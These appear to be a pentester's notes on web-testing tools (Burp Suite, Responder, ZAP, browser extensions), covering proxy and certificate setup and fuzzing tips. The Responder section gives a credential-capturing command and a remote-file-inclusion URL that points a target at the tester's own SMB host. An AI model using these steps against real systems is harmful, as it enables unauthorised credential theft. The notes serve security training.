---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Tools

## <mark style="color:green;">Burp Suite</mark>

* Digital plattform that collects tools for specialiced web penetration testing.
* Framework written in Java that aims to provide a one-stop-shop for web application penetration testing
* Capture and manipulate all of the traffic between an attacker and a webserver
* Can intercept, view, and modify request
* Burp suite has modules that can be added

### **Features**

* **Proxy:** Allows us to intercept and modify requests/responses.&#x20;
* **Repeater:** Allows us to capture, modify, then resend the same request numerous times. We could craft requests by hand too.
* **Intruder:** Allows us to spray an endpoint with requests.
* **Decoder:** Allows us to transform data, decoding captured information, or encoding a payload.
* **Comparer:** Allows us to compare two pieces of data at either word or byte level.
* **Sequencer:** Help us asses random tokens or other generated data.

### Configuration

#### Proxy

* We required the _FoxyProxy_ extension
* Create a proxy profile on FoxyProxy specifying IP 127.0.0.1 and PORT 8080
* Select the profile on the extension
* Then go to burpsuite proxy tab and set intercept to _on_

#### Configure HTTPS proxy

* Activate proxy and go to [http://burp/cert](http://burp/cert) on browser
* Download _cacert.der_ file
* Go to _about:preferences_ on browser
* Search _Cetificates_ and select _View Certificates_
* Click on Import and selct the cacer.der
* Mark _Trust this CA to indetify websites_ and save all

### Utilities

#### Define scope

* Go to target tab
* On left side select the IP/Domain
* Right-click it and select _add to scope_
* Then go to _proxy settings_ on proxy tab
* Go to the _Request Interception_ part and mark _And url is in target scope_
* Go to _proxy settings_ to the _Response Interception_ part and mark _Intercept responses_ and _Or Request was intercepted_

### Hotkeys

* **Ctrl + R:** Send petition to Repeater
* **Ctlr + U:** URL encode selected text

### Commands

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install burpsuite
```
{% endcode %}

***



## <mark style="color:green;">Responder</mark>

* Help in passive obtention of credentials by mounting a SMB server in web

### Commands

* Configurate file

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf #Installed here by default
```
{% endcode %}

***

* Initialize Responder

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo responder -I $networkinterface
```
{% endcode %}

{% hint style="info" %}
**Note:** If ypu get error in any port, set _off_ in the service related to that port in _Responder.conf_ file
{% endhint %}

***

* Make Remote file inclusion at page

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
</strong></code></pre>

***



## <mark style="color:green;">ZAP</mark>

* Proxy utility to intercept network traffict, stands for Zed Attack Proxy

### **Features**

* **Contexts:** Delimit the scope of the scanning
* **Spider:** Use spidering to get links in the code of a website
* **Active scan:** Attacks the website to get more information
* **Alerts:** Give vulnerabilities found on the web site
* **Sites:** Shows all the URL spidered with their petitions and vulnerabilities
* **History:** Shows petitions made to target sites

### **Configuration**

#### **Proxy**

* Install _SwitchyOmega_ extension
* Configure server to _localhost_ and port to _8080_ and save changes

#### Configure HTTPS proxy

* Go to _options>Network>Server Certificates_ and save the certificate
* Go to your browser settings, search for certificates and import the downloaded certificate in the _Authorities_ section (If your browser don't has this tab just import it on the certificates section)
* Mark _Trust this CA to indetify websites_ and save all.

#### Utilities

* Go to _adds-on_ tab, update all installed and from marketplace install_, Directory List 2.3, Directory List 2.3 LC, FuzzDB Files, FuzzDB Ofensive, python scripting, community scripts, custom payloads, json view, jwt support, viewstate_.
* Go to _options>HUD_ and unmark _Enable when using the ZAP desktop, welcome screen when a browser is opened._

### Tips

* Configure _Global Alert Filters_ and _Passive Scan Rules_ on Options to deactivated or set your own grade for the alert of a vulnerability.
* From _History_ tab you can right click and select _Resend_ to modify a petition made before
* **For fuzzing:**&#x20;
  * Select a part of the request and right-click _Fuzz_&#x20;
  * Select _Payloads_ button, select dictionary file or enter custom words
  * In _Fuzz>Message Proccesor_s tab add a new one of type _Tag Creator_ and set it to categorize responses with specific content
  * In _Options>Anti-CSRF cert token_ add the tokens detected in forms POST petitions
  * When not getting consistent token handle in _Fuzz>Options_ tab reduce the threads to 1
  * When getting 304 responses go to _Fuzz>Options_ activate _Follow Redirects_
  *

### Commands

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install zaproxy
```
{% endcode %}

***



## <mark style="color:green;">Hacktools</mark>

* Browser extension that help us with scripts, commands and tips for web attacks
* [https://addons.mozilla.org/en-US/firefox/addon/hacktools/](https://addons.mozilla.org/en-US/firefox/addon/hacktools/)

### **Features**

* Reverse shell scripts
* PHP reverse shell scripts
* TTY Spawn shell
* Linux commands
* Powershell commands
* Windows file transfer methods
* Local File Inclusion
* Cross-Site Scripting
* SQL Injection
* Data Encoding
* Obfuscated Files or Information
* Hash generator
* MSF Venom Builder



## <mark style="color:green;">FoxyProxy</mark>

* Browser extension that help us creating proxies, usually for request-response analysis
* [https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)



## <mark style="color:green;">Wappalyzer</mark>

* Browser extension that help us sending anonymous information about websites visited, including domain name and identified technologies.
* [https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)

